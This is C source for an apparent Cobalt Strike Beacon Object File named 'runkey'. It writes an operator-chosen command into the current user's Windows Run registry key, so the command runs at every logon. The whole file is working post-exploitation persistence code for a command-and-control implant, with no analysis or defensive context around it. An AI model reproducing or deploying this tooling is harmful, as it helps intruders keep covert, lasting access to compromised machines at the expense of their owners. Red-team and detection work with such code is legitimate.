/*
 * runkey <name> <command> - add HKCU Run persistence.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

void go(char *args, int alen)
{
    datap parser;
    char *name, *command;
    int nlen = 0, clen = 0;
    HKEY h;
    LONG rc;

    if (!args || alen <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "usage: runkey <name> <command>\n");
        return;
    }

    BeaconDataParse(&parser, args, alen);
    name = BeaconDataExtract(&parser, &nlen);
    command = BeaconDataExtract(&parser, &clen);
    if (!name || !command) return;

    rc = ADVAPI32$RegCreateKeyExA(HKEY_CURRENT_USER,
                                  "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                                  0, NULL, 0, KEY_SET_VALUE, NULL, &h, NULL);
    if (rc != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "RegCreateKeyEx failed: %ld\n", (long)rc);
        return;
    }

    rc = ADVAPI32$RegSetValueExA(h, name, 0, REG_SZ, (const BYTE *)command, clen + 1);
    if (rc == ERROR_SUCCESS)
        BeaconPrintf(CALLBACK_OUTPUT, "Added Run key: %s = %s\n", name, command);
    else
        BeaconPrintf(CALLBACK_ERROR, "RegSetValueEx failed: %ld\n", (long)rc);

    ADVAPI32$RegCloseKey(h);
}
